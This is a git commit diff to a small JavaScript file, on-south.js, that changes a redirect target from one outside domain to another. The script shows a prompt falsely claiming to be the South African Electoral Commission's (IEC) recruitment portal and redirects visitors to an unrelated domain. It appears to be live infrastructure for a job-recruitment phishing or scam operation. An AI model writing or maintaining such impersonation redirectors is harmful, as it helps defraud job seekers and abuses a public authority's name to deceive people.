0fa7382f96901c8cc0fd60bcc3b6954aaedc4608
mmyafiong <seconds.borders-0g@icloud.com>
2026-09-23 09:13:15 +0100

    Update redirect URL in on-south.js

--- on-south.js
+++ on-south.js
@@ -1,5 +1,5 @@
 var password = 'IEC Recruitment'
 password=prompt('SMS: Welcome to the Official Electoral Commission of South Africa (IEC) Recruitment Portal, press OK to Proceed','IEC Recruitment');
 if (password != 'IEC Recruitment') {
-location.href='https://www.mmyafiong.fit/apply-za-jobs';
+location.href='https://www.shadowoffre.us/apply-za-jobs';
 }
